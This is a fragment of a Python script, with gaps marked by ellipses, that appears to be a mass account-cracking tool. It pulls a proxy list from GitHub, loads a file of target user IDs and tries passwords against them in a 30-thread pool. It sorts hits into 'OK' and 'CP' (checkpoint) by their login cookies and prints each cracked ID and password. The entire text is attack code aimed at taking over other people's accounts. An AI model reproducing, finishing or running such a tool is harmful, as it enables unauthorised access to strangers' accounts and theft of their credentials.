...
try:
	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/https.txt').text
...
def FILE():
			...
			try:
				print('')
				print('')
				print('        \033[1;37m👇𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑳𝑬👇          ')
				print('')
				fileX = input (' \033[1;37m𝑭𝑰𝑳𝑬 𝑫𝑨𝑵𝑬 = ');os.system('clear');banner()
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit(" \033[1;37m𝑭𝑰𝑳𝑬 𝑯𝑨𝑳𝑨𝒀𝑨 [!]"%(fileX))
def setting():
	os.system('clear')
	banner()
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m 𝑶𝑲 = %s '%(ok))
	print('')
	print(' \033[1;37m 𝑪𝑷 = %s '%(cp))
	print('')
	exit()
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([u,u,u])
	sys.stdout.write(f"\r \033[1;31m[\033[1;31m𝑻𝑨𝑹𝑴𝑨𝒀]   {P}{H}{loop} \033[1;34m{P}{P}{H}=\033[1;34m {ok}\033[1;34m{P} \033[1;34m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m [ 𝑻𝑨𝑹𝑴𝑨𝒀😷-𝑪𝑷 ]\033[1;37m  {idf}\033[1;37m |\033[1;37m {pw}')
				...
				print(f'\r\033[1;34m [ 𝑻𝑨𝑹𝑴𝑨𝒀🙈-𝑶𝑲 ]\033[1;34m  {idf} \033[1;34m| \033[1;34m{pw}')
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> 𝑻𝑨𝑹𝑴𝑨𝒀        %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMA𝑻𝑨𝑹𝑴𝑨𝒀, PERIKSA & COBA LAGI'
